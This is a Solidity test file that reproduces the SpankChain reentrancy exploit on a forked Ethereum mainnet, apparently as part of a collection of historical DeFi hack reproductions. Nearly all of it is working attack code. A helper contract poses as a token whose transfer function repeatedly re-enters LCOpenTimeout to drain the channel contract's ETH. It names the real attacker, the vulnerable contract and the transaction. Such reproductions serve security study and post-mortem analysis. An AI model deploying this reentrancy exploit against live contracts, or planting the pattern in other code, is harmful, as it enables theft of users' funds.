// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";

// @KeyInfo - Total Lost : 155 $ETH
// Attacker : https://etherscan.io/address/0xcf267eA3f1ebae3C29feA0A3253F94F3122C2199
// Attack Contract : https://etherscan.io/address/0xc5918a927C4FB83FE99E30d6F66707F4b396900E
// Vulnerable Contract : https://etherscan.io/address/0xf91546835f756DA0c10cFa0CDA95b15577b84aA7
// Attack Tx : https://etherscan.io/tx/0x21e9d20b57f6ae60dac23466c8395d47f42dc24628e5a31f224567a2b4effa88

// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0xf91546835f756DA0c10cFa0CDA95b15577b84aA7#code

// @Analysis
// Post-mortem : 
// Twitter Guy : 
// Hacking God : 
pragma solidity ^0.8.0;

interface ISpankChain {
    function createChannel(
        bytes32 _lcID,
        address _partyI,
        uint256 _confirmTime,
        address _token,
        uint256[2] memory _balances // [eth, token]
    ) external payable;
    function LCOpenTimeout(bytes32 _lcID) external;

    event DidLCOpen (
        bytes32 indexed channelId,
        address indexed partyA,
        address indexed partyI,
        uint256 ethBalanceA,
        address token,
        uint256 tokenBalanceA,
        uint256 LCopenTimeout
    );
}

contract SpankChainExploit is BaseTestWithBalanceLog {
    uint256 blocknumToForkFrom = 6_467_248 - 1;

    function setUp() public {
        vm.createSelectFork("mainnet", blocknumToForkFrom);
        //Change this to the target token to get token balance of,Keep it address 0 if its ETH that is gotten at the end of the exploit
        fundingToken = address(0);
    }

    function testExploit() public balanceLog {
        //implement exploit code here
        vm.deal(address(this), 5 ether); //simulation flashloan
        SpankChainExploitHelper h = new SpankChainExploitHelper();
        h.exploit{value: 5 ether}(32);
        payable(address(0x0)).transfer(5 ether); //simulation replay flashloan
    }

    fallback() payable external {}
}

contract SpankChainExploitHelper {
    ISpankChain spankChain = ISpankChain(0xf91546835f756DA0c10cFa0CDA95b15577b84aA7);
    uint256 limit;
    uint256 count = 1;
    function exploit(uint256 c) payable public {
        limit = c;
        uint256[2] memory balances;
        balances[0] = 5000000000000000000;
        balances[1] = 1;
        spankChain.createChannel{value: 5 ether}(
            hex"4e03657aea45a94fc7d47ba826c8d667c0d1e6e33a64a036ec44f58fa12d6c45",
            msg.sender, 
            type(uint256).max - block.timestamp + 1, 
            address(this), 
            balances);
        spankChain.LCOpenTimeout(hex"4e03657aea45a94fc7d47ba826c8d667c0d1e6e33a64a036ec44f58fa12d6c45");
        payable(msg.sender).transfer(address(this).balance);
    }

    function transfer(address recipient, uint256 amount) public returns (bool) {
        if (count < limit) {
            count = count + 1;
            spankChain.LCOpenTimeout(hex"4e03657aea45a94fc7d47ba826c8d667c0d1e6e33a64a036ec44f58fa12d6c45");
        }
        return true;
    }
    
    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool){
        return true;
    } 

    fallback() payable external {}
}
